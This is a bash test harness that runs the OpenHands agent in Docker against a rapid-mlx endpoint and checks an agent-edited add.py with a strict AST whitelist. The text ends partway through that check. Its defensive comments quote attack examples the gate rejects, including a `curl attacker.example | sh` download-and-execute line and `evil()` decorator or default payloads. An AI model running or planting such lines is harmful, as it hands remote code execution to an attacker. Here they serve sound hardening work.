#!/bin/bash
# OpenHands Docker E2E integration harness against a running `rapid-mlx serve`.
#
# What it proves:
#   1. OpenHands' CodeActAgent can connect to rapid-mlx's OpenAI-compatible
#      endpoint via LiteLLM's ``openai/<alias>`` provider prefix.
#   2. OpenHands' text-action edit format (``<execute_bash>...``,
#      ``<execute_ipython>...``, and its file-write markdown blocks —
#      parsed by OpenHands itself, NOT via OpenAI tool_calls) actually
#      rewrites a local file the way we asked ("fix the bug in add.py —
#      add, not subtract").
#
# Why the correctness signal is NOT OpenAI tool_calls: OpenHands'
# native wire (openhands.yaml capabilities.function_calling: false) is a
# text-action format. The CodeActAgent parses the model's plaintext
# reply, extracts actions, and applies file edits through its sandbox
# runtime. So the pass gate is whether the executed ``add()`` really
# returns ``a + b`` after openhands exits — not a simple grep, which
# would flake if the model reformats the body, and not a tool_call
# assertion, which the wire doesn't emit.
#
# This harness is the sibling of ``test_aider.sh``. Same arg parsing,
# same exit-code taxonomy — with docker-daemon + docker-in-docker
# sock-passthrough layered on for OpenHands' sandbox-runtime container.
# The correctness taxonomy diverges: this harness uses an AST-only
# whitelist (no runtime execution) — it parses ``add.py`` after the
# agent exits, requires a single top-level ``def add(a, b)`` with no
# decorators / defaults / annotations and a plain module-level shape,
# and matches the return expression against a semantic-add whitelist
# (``a + b`` / ``b + a`` / ``sum([a, b])`` / ``sum((a, b))``). Zero
# code execution on the host, so a bad / compromised model output can
# never touch the developer or CI process.
#
# Usage:
#   test_openhands.sh --model <alias> (--base-url <url> | --port <port>) [--timeout <secs>]
#
# ``--base-url`` takes the full ``http[s]://host:port/v1`` URL and is the
# preferred form — it lets the Python wrapper pass whatever URL the
# ``rapid_mlx_server`` fixture is actually pointed at. The URL passed
# into the OpenHands container has its host rewritten to
# ``host.docker.internal`` ONLY when the parsed host is a loopback alias
# (``localhost`` / ``127.0.0.1`` / ``0.0.0.0`` / ``::1``) — from inside
# the container those addresses would refer to the container itself,
# not the host where rapid-mlx is listening. Any other host (a
# remote-serve node, RFC1918 IP, DNS name, non-loopback IPv6) is
# preserved as-is so a fixture pointed at a genuine remote server still
# works.
#
# Exit codes (aligned with ``test_aider.sh``):
#   0  — OpenHands completed and the AST whitelist matched the rewritten file
#   1  — arg parse / setup error (also: docker daemon unreachable,
#        ``timeout`` / ``gtimeout`` missing, rapid-mlx serve unreachable)
#   2  — OpenHands runtime exited non-zero (agent crashed, LLM refused,
#        transport blip; runtime container failed to boot)
#   3  — OpenHands ran but the file wasn't corrected (edit didn't apply;
#        agent hit ``-i`` iteration cap without solving; LLM refused;
#        wrong operator, etc.)
#   4  — timeout

# ``set -euo pipefail`` so an unchecked setup step (``mktemp``,
# ``docker info``, ``mkdir``) aborts the harness instead of running
# OpenHands against a half-configured scratch dir. Mirrors the same
# lesson-learned gate baked into ``test_aider.sh`` (round-2 finding #4).
set -euo pipefail

# ---------------------------------------------------------------------------
# Pinned image tags — see PR body for the version-selection rationale.
#
# ``ghcr.io/all-hands-ai/openhands`` moved on from ``docker.all-hands.dev``
# (the old registry's DNS no longer resolves — see the PR body for the
# transition timeline). We pin to a specific ``0.9.0`` tag (multi-arch
# manifest — both linux/arm64 and linux/amd64) so the harness can't
# silently drift when a new OpenHands release lands upstream.
#
# The runtime container tag is coupled to the app tag: OpenHands
# derives its own hash-tagged runtime image from this baseline, so the
# baseline must match the OpenHands major version. Currently:
#   od_v0.9.0_image_nikolaik___python-nodejs_tag_python3.11-nodejs22
# ---------------------------------------------------------------------------
# Codex #1048 round-6 finding #2 (BLOCKING): the harness mounts
# ``/var/run/docker.sock`` into the OpenHands container, so a moved or
# compromised tag would hand host-daemon control to a swapped image.
# Both refs are pinned by multi-arch manifest-list digest as of the
# 2026-07-07 harness commit; the human-readable ``:tag`` piece is
# retained purely as a comment for future upgraders. Regenerate with
# ``docker buildx imagetools inspect <ref> | awk '/^Digest:/ {print $2}'``
# when bumping to a newer OpenHands release. Also keep this lane
# restricted to isolated Docker hosts — do NOT run the harness on a
# workstation that also runs the operator's rapid-mlx production
# services.
OPENHANDS_IMAGE="ghcr.io/all-hands-ai/openhands:0.9.0@sha256:d4b028e3b1f7ad6fdb1bba3579362c8298bb791b222e73a8355fd980bb987f1a"
# Runtime image — two-ref pattern to preserve supply-chain integrity while
# also working around an OpenHands 0.8.3 parser choke:
#
#   * ``OPENHANDS_RUNTIME_IMAGE_PULL`` — the ``repo:tag@sha256:hex`` form
#     used ONLY at ``docker pull`` time. This is what makes the mount of
#     ``/var/run/docker.sock`` safe: the daemon verifies the pulled
#     manifest against ``sha256:784f...472d`` before allowing local use,
#     so a moved / compromised tag can't hand host-daemon control to a
#     swapped image. Regenerate with
#     ``docker buildx imagetools inspect <ref> | awk '/^Digest:/ {print $2}'``
#     when bumping to a newer OpenHands release.
#
#   * ``OPENHANDS_RUNTIME_IMAGE`` — the ``repo:tag``-only form that we
#     pass to OpenHands via ``SANDBOX_CONTAINER_IMAGE``. OpenHands 0.8.3
#     (which ships inside the 0.9.0 app image) parses this ref in
#     ``runtime_build.py:188`` with ``base_image.split(':')`` — a straight
#     split on ``:``, which raises ``ValueError: too many values to unpack
#     (expected 2)`` on the three-way ``repo:tag@sha256:hex`` form BEFORE
#     any LLM call happens (all four family cells hit this on cold-cache
#     Docker paths; the 2026-07-06 pilot ran with images pre-cached and
#     didn't trigger). The ``:``-split has been refactored out on
#     OpenHands ``main`` so no upstream ask; we just need the ref we pass
#     to be splittable in exactly two pieces.
#
# The pull section below runs ``docker pull "$OPENHANDS_RUNTIME_IMAGE_PULL"``
# (digest-verified) and then ``docker tag "$OPENHANDS_RUNTIME_IMAGE_PULL"
# "$OPENHANDS_RUNTIME_IMAGE"``, so the two-colon alias points at the
# byte-identical content the digest verified. If the operator already had
# a locally-built ``repo:tag`` of this ref with a different digest, the
# ``docker tag`` step overrides it with our verified copy — which is what
# we want. The app image doesn't need this dance because OpenHands never
# feeds its own image ref through ``base_image.split(':')`` — only the
# runtime image does.
#
# Codex #1048 round-6 finding #2 (BLOCKING, still in force under this
# two-ref pattern): keep this lane restricted to isolated Docker hosts —
# do NOT run the harness on a workstation that also runs the operator's
# rapid-mlx production services.
OPENHANDS_RUNTIME_IMAGE_PULL="ghcr.io/all-hands-ai/runtime:od_v0.9.0_image_nikolaik___python-nodejs_tag_python3.11-nodejs22@sha256:784f7161295b87d3af26332dbbad5bcdd643641e87ed0038ed0c7f4b47c9472d"
OPENHANDS_RUNTIME_IMAGE="ghcr.io/all-hands-ai/runtime:od_v0.9.0_image_nikolaik___python-nodejs_tag_python3.11-nodejs22"

TIMEOUT=600
MAX_ITERATIONS=10
MODEL=""
PORT=""
BASE_URL=""
VERBOSE=0

usage() {
    echo "Usage: $0 --model <alias> (--base-url <url> | --port <port>) [--timeout <secs>] [--max-iterations <n>] [-v]" >&2
    exit 1
}

# Codex #1048 round-4 nit: guard value-taking options against missing
# ``$2`` before assigning, so a stray ``--model`` at EOL degrades to a
# clear ``usage()`` instead of the ``set -u`` "unbound variable" abort.
_require_value() {
    if [ "$#" -lt 2 ]; then
        echo "ERROR: missing value for $1" >&2
        usage
    fi
}

while [ $# -gt 0 ]; do
    case "$1" in
        --model) _require_value "$@"; MODEL="$2"; shift 2 ;;
        --port) _require_value "$@"; PORT="$2"; shift 2 ;;
        --base-url) _require_value "$@"; BASE_URL="$2"; shift 2 ;;
        --timeout) _require_value "$@"; TIMEOUT="$2"; shift 2 ;;
        --max-iterations) _require_value "$@"; MAX_ITERATIONS="$2"; shift 2 ;;
        -v|--verbose) VERBOSE=1; shift ;;
        -h|--help) usage ;;
        *) echo "unknown arg: $1" >&2; usage ;;
    esac
done

if [ -z "$MODEL" ] || { [ -z "$BASE_URL" ] && [ -z "$PORT" ]; }; then
    usage
fi

# Derive BASE_URL from --port only if --base-url wasn't given (back-compat
# for the standalone invocation shape kept for local docs/dev). --base-url
# wins so a Python wrapper that always passes the full URL is authoritative.
if [ -z "$BASE_URL" ]; then
    BASE_URL="http://127.0.0.1:${PORT}/v1"
fi

# ``python3`` is a hard prerequisite of both the URL parser below AND the
# post-run correctness check — check it up-front (fail fast) so a broken
# system Python doesn't get diagnosed as an OpenHands failure.
if ! command -v python3 >/dev/null 2>&1; then
    echo "ERROR: python3 not found on PATH — required for URL parsing + correctness check" >&2
    exit 1
fi

# Extract host + port from --base-url so we can decide whether to rewrite
# the host for the inside-container view. Codex #1048 round-1 finding #1
# (BLOCKING): the previous unconditional rewrite to ``host.docker.internal``
# silently broke a CI shard pointing at a genuine remote-serve node
# (``--base-url http://remote-host:8802/v1``) — the container would have
# hit the M3 Ultra host instead of the intended remote server. We rewrite
# ONLY the local-loopback aliases (``localhost``, ``127.0.0.1``,
# ``0.0.0.0``, ``::1``), and preserve any other host so remote fixtures
# still work.
#
# Codex #1048 round-2 finding #1 (BLOCKING): the previous sed regex
# ``[^:/]+`` for the host class ruled out ``:`` inside the hostname, so
# a valid bracketed IPv6 URL like ``http://[::1]:8802/v1`` exited as
# "could not extract port" — despite the case-statement including
# ``::1``. Fix: parse with Python's ``urllib.parse`` (via ``python3``,
# which is already a hard prerequisite of the correctness check below),
# strip IPv6 brackets from the extracted host, and only THEN test
# against the loopback set. Handles ``http://host:port/path``,
# ``http://[::1]:port/path``, ``http://[fe80::1%25en0]:port/path``,
# and any IDN hostname LiteLLM might feed us.
if ! _URL_PARTS="$(python3 - "$BASE_URL" <<'PYEOF'
import sys
from urllib.parse import urlparse

url = sys.argv[1]
parsed = urlparse(url)
if parsed.scheme not in ("http", "https"):
    print(f"ERROR: unsupported scheme {parsed.scheme!r} in {url!r}",
          file=sys.stderr)
    sys.exit(1)

host = parsed.hostname or ""
# Codex #1048 round-5 nit: ``parsed.port`` raises ``ValueError`` on a
# non-numeric port (``http://127.0.0.1:abc/v1``) which would leak a
# Python traceback ahead of the bash wrapper could-not-parse error.
# Catch it explicitly so the failure mode is a single clean message.
# NOTE: bash 3.2 scans heredoc content inside ``$(...)`` for quote
# balance, so keep this block apostrophe-free.
try:
    port = parsed.port
except ValueError:
    print(f"ERROR: non-numeric port in {url!r}", file=sys.stderr)
    sys.exit(1)
# Codex #1048 round-8 side-effect: preserving path exposed a
# pre-existing gap — a proxied URL like
# ``https://gateway.example.com/rapid/v1`` has no explicit port, so
# ``parsed.port`` is None even though the URL is well-formed. Default
# to the scheme-standard port (80 for http, 443 for https) so those
# deployments no longer trip the "could not extract" gate. Explicit
# ports still win.
if port is None:
    port = {"http": 80, "https": 443}[parsed.scheme]
if not host:
    print(f"ERROR: could not extract host from {url!r}", file=sys.stderr)
    sys.exit(1)

# urllib strips the surrounding brackets from IPv6 hosts already
# (``[::1]:8802`` → ``::1``), so a plain string equality against the
# loopback set below works for both v4 and v6 aliases.
# Codex #1048 round-6 finding #1 (BLOCKING): also emit the scheme so
# the URL rebuild below preserves ``https://`` when the caller passed
# an HTTPS remote-serve node. Previous code hard-wired ``http://`` and
# would silently connect over the wrong protocol.
# Codex #1048 round-8 finding #1 (BLOCKING): also emit the path so the
# URL rebuild does not silently drop a base-path prefix on proxied
# deployments (``https://gateway.example.com/rapid/v1``). We default
# to ``/v1`` only if the caller passed no path at all — the rapid-mlx
# server always exposes chat completions under ``/v1``. Escape TAB so
# ``\t`` does not collide with awk splitting; urllib does not permit
# raw TAB in the path anyway (would be percent-encoded first).
path = parsed.path or "/v1"
print(f"{parsed.scheme}\t{host}\t{port}\t{path}")
PYEOF
)"; then
    echo "ERROR: could not parse --base-url=$BASE_URL" >&2
    exit 1
fi

# Split four tab-separated fields (scheme / host / port / path) with
# awk so we do not have to care about IPv6 colons or the bash-3.2
# lack of named-array literals.
CONTAINER_SCHEME="$(printf '%s\n' "$_URL_PARTS" | awk -F '\t' '{print $1}')"
CONTAINER_HOST="$(printf '%s\n' "$_URL_PARTS" | awk -F '\t' '{print $2}')"
CONTAINER_PORT="$(printf '%s\n' "$_URL_PARTS" | awk -F '\t' '{print $3}')"
CONTAINER_PATH="$(printf '%s\n' "$_URL_PARTS" | awk -F '\t' '{print $4}')"

# Codex #1048 round-3 finding #1 (BLOCKING): explicitly validate the
# tab-delimited shape of the Python parser output BEFORE downstream
# reads. The parser always writes errors to stderr and never emits a
# tab on the ERROR path — but if a future edit accidentally leaks an
# error onto stdout, we'd construct a malformed CONTAINER_BASE_URL and
# hit Docker with garbage. This gate turns that into a fast exit 1.
# The path field is also required to start with ``/`` — urllib's
# ``parsed.path`` guarantees this for absolute URLs so a missing
# leading slash means the parser is broken and we should fail loud.
if [ -z "$CONTAINER_SCHEME" ] || [ -z "$CONTAINER_HOST" ] || [ -z "$CONTAINER_PORT" ] || [ -z "$CONTAINER_PATH" ] \
   || ! [[ "$CONTAINER_SCHEME" =~ ^https?$ ]] \
   || ! [[ "$CONTAINER_PORT" =~ ^[0-9]+$ ]] \
   || [ "${CONTAINER_PATH:0:1}" != "/" ]; then
    echo "ERROR: URL parser returned malformed scheme/host/port/path shape " >&2
    echo "       (raw='$_URL_PARTS' scheme='$CONTAINER_SCHEME' host='$CONTAINER_HOST' port='$CONTAINER_PORT' path='$CONTAINER_PATH')" >&2
    exit 1
fi

case "$CONTAINER_HOST" in
    localhost|127.0.0.1|0.0.0.0|::1)
        CONTAINER_HOST="host.docker.internal"
        ;;
    *)
        # Preserve any other host as-is (remote-serve node, RFC1918 IP,
        # DNS name, non-loopback IPv6). LiteLLM handles bracket-wrapped
        # IPv6 in URLs, so we only re-bracket the host when we're
        # rebuilding the URL below.
        ;;
esac

# Re-bracket IPv6 hosts for URL assembly. ``host.docker.internal`` and
# IPv4 literals go through unchanged; only literal IPv6 addresses need
# the ``[…]`` wrapping per RFC 3986 §3.2.2. Scheme and path come from
# the parsed input so ``--base-url https://gateway.example.com/rapid/v1``
# round-trips correctly.
case "$CONTAINER_HOST" in
    *:*)
        CONTAINER_BASE_URL="${CONTAINER_SCHEME}://[${CONTAINER_HOST}]:${CONTAINER_PORT}${CONTAINER_PATH}"
        ;;
    *)
        CONTAINER_BASE_URL="${CONTAINER_SCHEME}://${CONTAINER_HOST}:${CONTAINER_PORT}${CONTAINER_PATH}"
        ;;
esac

# Docker daemon must be reachable BEFORE we spend 5-10 minutes staging
# the sandbox runtime. ``docker info`` is the canonical "server reachable"
# probe (``docker version`` returns the client version even when the
# daemon socket is dead).
if ! docker info >/dev/null 2>&1; then
    echo "ERROR: docker daemon not reachable — start Docker Desktop / dockerd first" >&2
    exit 1
fi

# Pick a timeout wrapper — same requirement as ``test_aider.sh``: we need
# the whole exec'd tree killed on timeout, and BSD's built-in no-timeout
# fallback would leak a running ``docker run`` past harness exit.
if command -v gtimeout >/dev/null 2>&1; then
    TIMEOUT_CMD=(gtimeout --preserve-status --kill-after=15 "$TIMEOUT")
elif command -v timeout >/dev/null 2>&1; then
    TIMEOUT_CMD=(timeout --preserve-status --kill-after=15 "$TIMEOUT")
else
    echo "ERROR: neither 'timeout' nor 'gtimeout' available — install " >&2
    echo "       coreutils (macOS: 'brew install coreutils') before running." >&2
    exit 1
fi

# Scratch state — HOME override so the OpenHands agent drops its config /
# cache into a throw-away tree we can nuke on exit. We NEVER touch the
# operator's real ``~/.openhands*`` state. ``mktemp -d`` both for atomic
# creation and to avoid predictable-path rm -rf races.
WORKDIR="$(mktemp -d -t openhands-test-work.XXXXXX)"
OPENHANDS_STATE="$(mktemp -d -t openhands-test-state.XXXXXX)"
mkdir -p "$OPENHANDS_STATE/.openhands"

# Uniqueness for the docker container name — timestamp + PID + $$ nesting
# guard so parallel harness invocations (or a stale prior run's zombie)
# can't collide on the name. We also keep the value in a variable so the
# cleanup trap can force-remove even if the run was aborted before
# ``docker run`` returned.
CONTAINER_NAME="openhands-test-$$-$(date +%s)"

cleanup() {
    local rc=$?
    # Best-effort: ``docker rm -f`` succeeds silently if the container
    # already exited via ``--rm``; suppress stderr so a race with the
    # auto-remove doesn't spam an error into the harness log. We do NOT
    # ``docker system prune`` — that would nuke the operator's other
    # containers (violates G11 + the operator-lane guardrail).
    docker rm -f "$CONTAINER_NAME" >/dev/null 2>&1 || true
    if [ "$VERBOSE" -eq 0 ]; then
        rm -rf "$WORKDIR" "$OPENHANDS_STATE" 2>/dev/null || true
    else
        echo "VERBOSE: preserved WORKDIR=$WORKDIR OPENHANDS_STATE=$OPENHANDS_STATE" >&2
    fi
    exit "$rc"
}
trap cleanup EXIT INT TERM

# Toy file with an obvious bug — identical to ``test_aider.sh`` so the
# two harnesses agree on the pass gate and a divergence between agents
# is obviously the agent, not the fixture.
cat > "$WORKDIR/add.py" <<'PYEOF'
def add(a, b):
    return a - b  # BUG
PYEOF

# Sanity: is the server actually up on the HOST-side URL? A quick
# /v1/models probe with a 5 s timeout catches "operator forgot to boot
# serve" instantly instead of eating the full harness timeout. We probe
# BASE_URL (host-visible), not CONTAINER_BASE_URL (only meaningful
# inside the container).
if ! curl -sS -m 5 "$BASE_URL/models" >/dev/null 2>&1; then
    echo "ERROR: rapid-mlx server not reachable at $BASE_URL" >&2
    exit 1
fi

# LiteLLM (which OpenHands uses under the hood) needs the ``openai/``
# prefix to route through the OpenAI-compat chat completions path against
# our custom base URL — without it LiteLLM tries to pick a provider
# from the alias string and fails on non-canonical rapid-mlx aliases.
LITELLM_MODEL="openai/${MODEL}"

# Ensure the runtime base image is present locally — if the pull fails
# we want that surfaced as a setup error (exit 1), not misdiagnosed as
# an OpenHands runtime error (exit 2). ``docker pull`` with ``--quiet``
# is idempotent and prints only the digest on success; with ``2>&1`` we
# fold pull chatter (progress lines) into the harness log for diagnostics.
# The runtime pull ref is digest-pinned (integrity), and after pull we
# re-tag to the plain ``repo:tag`` alias that OpenHands' ``base_image.split(':')``
# parser can handle — see the two-ref explanation up top.
for img in "$OPENHANDS_IMAGE" "$OPENHANDS_RUNTIME_IMAGE_PULL"; do
    if ! docker image inspect "$img" >/dev/null 2>&1; then
        echo "[test_openhands.sh] pulling missing image: $img"
        if ! docker pull "$img" 2>&1 | tail -5 >&2; then
            echo "ERROR: docker pull failed for $img" >&2
            exit 1
        fi
    fi
done

# Re-tag the digest-verified runtime image to the plain ``repo:tag`` alias
# OpenHands passes through ``base_image.split(':')``. ``docker tag`` is
# atomic and content-addressed — the alias points at the byte-identical
# manifest we just verified against ``sha256:784f...472d``. Idempotent:
# safe to re-run on warm caches.
if ! docker tag "$OPENHANDS_RUNTIME_IMAGE_PULL" "$OPENHANDS_RUNTIME_IMAGE" 2>&1 | tail -5 >&2; then
    echo "ERROR: docker tag $OPENHANDS_RUNTIME_IMAGE_PULL -> $OPENHANDS_RUNTIME_IMAGE failed" >&2
    exit 1
fi

echo "[test_openhands.sh] model=$MODEL host-base-url=$BASE_URL container-base-url=$CONTAINER_BASE_URL"
echo "[test_openhands.sh] litellm-model=$LITELLM_MODEL timeout=${TIMEOUT}s max-iter=${MAX_ITERATIONS}"
echo "[test_openhands.sh] openhands-image=$OPENHANDS_IMAGE"
echo "[test_openhands.sh] runtime-image-pull=$OPENHANDS_RUNTIME_IMAGE_PULL"
echo "[test_openhands.sh] runtime-image=$OPENHANDS_RUNTIME_IMAGE (local alias for base_image.split(':'))"
echo "[test_openhands.sh] scratch workdir=$WORKDIR openhands-state=$OPENHANDS_STATE"
echo "[test_openhands.sh] container-name=$CONTAINER_NAME"
echo "[test_openhands.sh] BEFORE add.py:"
cat "$WORKDIR/add.py"
echo "--------"

# Run OpenHands one-shot with ``python -m openhands.core.main -t "..."``.
# Key env-var wiring:
#   SANDBOX_CONTAINER_IMAGE  — the pre-built runtime; when this image
#                              string contains the ``ghcr.io/all-hands-ai
#                              /runtime`` repo prefix, OpenHands' builder
#                              short-circuits its Dockerfile-from-scratch
#                              path and reuses / derives from this image
#                              instead of pulling ``nikolaik`` from Docker
#                              Hub. Saves ~5 minutes of apt-install on a
#                              cold M3 Ultra.
#   SANDBOX_USER_ID          — matches the host UID so files created by
#                              the sandbox in our bind-mounted WORKDIR
#                              come back owned by the invoking user, not
#                              root. Without this, cleanup rm -rf fails
#                              on macOS when the docker VM's overlay
#                              driver leaves root-owned artifacts.
#   SANDBOX_TIMEOUT          — per-command timeout inside the sandbox;
#                              default 120s is tight for slow local
#                              inference, we bump to 180s.
#   WORKSPACE_MOUNT_PATH     — the ABSOLUTE HOST PATH that OpenHands will
#                              bind-mount into the sandbox as its
#                              workspace. This is critical — without it
#                              OpenHands uses a default path that won't
#                              exist / won't match our WORKDIR.
#   WORKSPACE_BASE           — the in-container path the sandbox sees as
#                              the workspace. Matches the openhands
#                              image default (``/opt/workspace_base``).
#   LLM_BASE_URL/MODEL/API_KEY — LiteLLM wiring for the rapid-mlx endpoint.
# Docker flags:
#   --add-host host.docker.internal:host-gateway  — required on Linux
#                              (macOS Docker Desktop injects this
#                              automatically, but Linux CI needs the
#                              explicit --add-host). Keeping it here
#                              works on both platforms and is idempotent.
#   -v /var/run/docker.sock:/var/run/docker.sock — docker-in-docker sock
#                              passthrough so OpenHands can spawn its
#                              sandbox runtime container.
#   --pull=missing             — only pull if not already cached; the
#                              two images ARE cached (we ensured above),
#                              so this is a no-op belt-and-braces guard.
LOG="$WORKDIR/openhands.log"
STATUS=0

# We disable ``set -e`` for the docker run so a non-zero exit (timeout,
# agent crash, LLM refusal, transport blip) is captured into $STATUS
# instead of aborting the harness before we can print the diagnostic tail.
set +e
"${TIMEOUT_CMD[@]}" \
docker run \
    --rm \
    --name "$CONTAINER_NAME" \
    -e "SANDBOX_CONTAINER_IMAGE=$OPENHANDS_RUNTIME_IMAGE" \
    -e "SANDBOX_USER_ID=$(id -u)" \
    -e "SANDBOX_TIMEOUT=180" \
    -e "WORKSPACE_MOUNT_PATH=$WORKDIR" \
    -e "WORKSPACE_BASE=/opt/workspace_base" \
    -e "LLM_BASE_URL=$CONTAINER_BASE_URL" \
    -e "LLM_MODEL=$LITELLM_MODEL" \
    -e "LLM_API_KEY=rapidmlx" \
    -v /var/run/docker.sock:/var/run/docker.sock \
    -v "$WORKDIR:/opt/workspace_base" \
    -v "$OPENHANDS_STATE/.openhands:/home/openhands/.openhands" \
    --add-host host.docker.internal:host-gateway \
    --pull=missing \
    "$OPENHANDS_IMAGE" \
    python -m openhands.core.main \
        -i "$MAX_ITERATIONS" \
        -d /opt/workspace_base \
        -t "The file add.py in the current workspace has a bug: it returns a - b when it should return a + b. Open add.py, change the '-' operator to '+' in the return statement, and save the file. Do not modify anything else. Once the file is saved, stop." \
    >"$LOG" 2>&1
STATUS=$?
set -e

# Detect timeout: 124 = coreutils timeout (SIGTERM path); 137 = --kill-after
# escalation (SIGKILL); 143 = SIGTERM. All three mean "we killed it, not
# OpenHands exiting cleanly with a non-zero code."
if [ "$STATUS" -eq 124 ] || [ "$STATUS" -eq 137 ] || [ "$STATUS" -eq 143 ]; then
    echo "[test_openhands.sh] TIMEOUT after ${TIMEOUT}s" >&2
    echo "--- last 60 lines of openhands log ---" >&2
    tail -60 "$LOG" >&2 || true
    exit 4
fi

echo "[test_openhands.sh] openhands exit=$STATUS"
echo "--- last 60 lines of openhands log ---"
tail -60 "$LOG" || true
echo "--------"
echo "[test_openhands.sh] AFTER add.py:"
cat "$WORKDIR/add.py"
echo "--------"

if [ "$STATUS" -ne 0 ]; then
    echo "[test_openhands.sh] FAIL: openhands exited $STATUS" >&2
    exit 2
fi

# Correctness check — Codex #1048 round-4 finding #1 (BLOCKING): the
# previous multi-pair runtime sweep imported and executed ``add.py``
# on the host to test five (a, b) → a+b pairs. Because ``add.py`` is
# written by an LLM-driven agent, in-process ``exec_module`` opens a
# host-side arbitrary-code-execution surface if the model output is
# ever bad or compromised. Fix: swap to a strict **AST whitelist** —
# parse the file, find ``def add(a, b): …``, and require the return
# expression to be one of a small semantic-add whitelist (``a + b``,
# ``b + a``, ``sum([a, b])`` / ``sum((a, b))``). The ``operator.add``
# branch was in the whitelist through round-4 but was dropped in
# round-5 because it accepted a return of ``operator.add(a, b)`` even
# when ``import operator`` was missing at module top level (would
# ``NameError`` at import time). Zero code execution, so the host is
# never exposed to the model's output.
#
# The whitelist is intentionally tight — a strict pattern match on
# argument names (``a``, ``b``, in either order) — which makes the
# gate strictly stronger than the previous five-pair runtime sweep:
# no ``return a - b + k``, ``return (a - b) + k``, ``return CONST``,
# ``return a * b``, or hard-coded-value cheat can satisfy it, because
# the AST shape itself is what's asserted, not the numeric behavior.
# Rejects on any of:
#   * missing ``def add`` or a signature that isn't ``(a, b)``
#   * extra top-level statements next to the ``def add`` (round-6 #3)
#   * a return expression that isn't a bare Name-Name addition or a
#     ``sum([a, b])`` / ``sum((a, b))`` call
#   * an extra return / conditional / assignment inside the function
#     body before the return (defence-in-depth against
#     ``if <cond>: return 5`` style cheats)
if ! python3 - "$WORKDIR" <<'PYEOF'
import ast
import sys

workdir = sys.argv[1]
target = f"{workdir}/add.py"

with open(target) as fh:
    source = fh.read()

try:
    tree = ast.parse(source)
except SyntaxError as exc:
    print(f"[correctness] SYNTAX-ERROR: {exc}", file=sys.stderr)
    sys.exit(1)

# Codex #1048 round-5 finding #1 (BLOCKING): ``ast.walk`` walked all
# nested nodes, so ``def wrapper(): def add(a, b): return a + b`` would
# find the nested ``add`` and pass — but the module doesn't expose a
# top-level ``add`` any more, so an actual user of the file gets
# ``NameError``. Restrict to top-level statements only.
#
# Codex #1048 round-6 finding #3 (BLOCKING): the previous gate accepted
# ANY extra top-level statement as long as a ``def add`` was somewhere
# in the module — so ``import os; os.system('curl attacker.example |
# sh'); def add(a, b): return a + b`` would pass despite the prompt
# telling the agent "Do not modify anything else." Restrict the module
# body to a single top-level statement (the ``def add``) plus an
# optional leading module docstring. Anything else is rejected.
module_body = list(tree.body)
if module_body and (
    isinstance(module_body[0], ast.Expr)
    and isinstance(module_body[0].value, ast.Constant)
    and isinstance(module_body[0].value.value, str)
):
    module_body = module_body[1:]
if len(module_body) != 1 or not (
    isinstance(module_body[0], ast.FunctionDef) and module_body[0].name == "add"
):
    print(
        "[correctness] AST-ERROR: module top level must be a single "
        "``def add`` (optionally preceded by a docstring); got "
        + ", ".join(
            f"{type(n).__name__}"
            f"({getattr(n, 'name', getattr(getattr(n, 'value', None), 'id', '?'))})"
            for n in module_body
        ),
        file=sys.stderr,
    )
    sys.exit(1)

funcs = [
    n for n in tree.body
    if isinstance(n, ast.FunctionDef) and n.name == "add"
]
if not funcs:
    print(
        "[correctness] AST-ERROR: no top-level def add() in module",
        file=sys.stderr,
    )
    sys.exit(1)
if len(funcs) > 1:
    print(
        "[correctness] AST-ERROR: multiple top-level def add() "
        f"definitions found ({len(funcs)}) — reject as ambiguous",
        file=sys.stderr,
    )
    sys.exit(1)
func = funcs[0]

# Codex #1048 round-7 finding #1 (BLOCKING): reject decorators,
# defaults, arg / return annotations, and type comments on ``def
# add``. Without this gate the following payloads would satisfy the
# name / body checks but still run attacker code or rebind ``add``:
#   * ``@evil()\ndef add(a, b): return a + b`` — decorator runs at
#     import time
#   * ``def add(a=evil(), b=0): return a + b`` — default eval'd at
#     definition time
#   * ``def add(a: evil(), b) -> evil(): ...`` — 3.10+ evaluates
#     annotations at def time unless ``from __future__ import
#     annotations`` is set, which we do not force
# All three are trivial for a compromised model output to reach; the
# harness never imports ``add.py``, but a downstream reviewer might
# copy-run it and get owned. Fail fast at the gate.
if func.decorator_list:
    print(
        "[correctness] AST-ERROR: def add must have no decorators; "
        f"got {[ast.unparse(d) for d in func.decorator_list]}",
        file=sys.stderr,
    )
    sys.exit(1)
if func.returns is not None:
    print(
        "[correctness] AST-ERROR: def add must have no return "
        f"annotation; got -> {ast.unparse(func.returns)}",
        file=sys.stderr,
    )
    sys.exit(1)
if getattr(func, "type_comment", None):
    print(
        "[correctness] AST-ERROR: def add must have no type comment; "
        f"got # type: {func.type_comment}",
        file=sys.stderr,
    )
    sys.exit(1)

# Signature must be exactly (a, b) — kwarg-only / *args / **kwargs
# defences prevent ``def add(*args): return sum(args)`` etc. which
# would pass the return check but doesn't match the harness's stated
# fix ("change '-' to '+' in the return statement").
args = func.args
if (
    len(args.args) != 2
    or {a.arg for a in args.args} != {"a", "b"}
    or args.vararg is not None
    or args.kwarg is not None
    or args.kwonlyargs
    or args.posonlyargs
    or args.defaults
    or args.kw_defaults
):
    print(
        f"[correctness] AST-ERROR: def add signature must be (a, b) "
        f"with no defaults, got args={[a.arg for a in args.args]} "
        f"vararg={args.vararg} kwarg={args.kwarg} "
        f"kwonly={[a.arg for a in args.kwonlyargs]} "
        f"posonly={[a.arg for a in args.posonlyargs]} "
        f"defaults={len(args.defaults)} "
        f"kw_defaults={len(args.kw_defaults)}",
        file=sys.stderr,
    )
    sys.exit(1)
# Codex #1048 round-7: reject arg annotations. ``ast.arg.annotation``
# is None for a bare ``a`` / ``b``, non-None for ``a: evil()``. Even
# if ``from __future__ import annotations`` were in the module we
# still disallow annotations here — anything the harness accepts must
# match "pure Python change '-' to '+' in the return statement" — so
# an annotation is off-taxonomy regardless of when it evaluates.
for a in args.args:
    if a.annotation is not None:
        print(
            f"[correctness] AST-ERROR: def add arg {a.arg!r} must have "
            f"no annotation; got : {ast.unparse(a.annotation)}",
            file=sys.stderr,
        )
        sys.exit(1)

# Body: allow a leading docstring (Expr(Constant(str))) but require the
# next statement to be a Return with a whitelisted expression, and
# reject any other statement.
body = list(func.body)
if body and (
    isinstance(body[0], ast.Expr)
    and isinstance(body[0].value, ast.Constant)
    and isinstance(body[0].value.value, str)
):
    body = body[1:]

if len(body) != 1 or not isinstance(body[0], ast.Return):
    print(
        "[correctness] AST-ERROR: function body must be a single Return "
        "(after an optional docstring); got "
        + ", ".join(type(n).__name__ for n in body),
        file=sys.stderr,
    )
    sys.exit(1)

expr = body[0].value
if expr is None:
    print("[correctness] AST-ERROR: bare return with no value", file=sys.stderr)
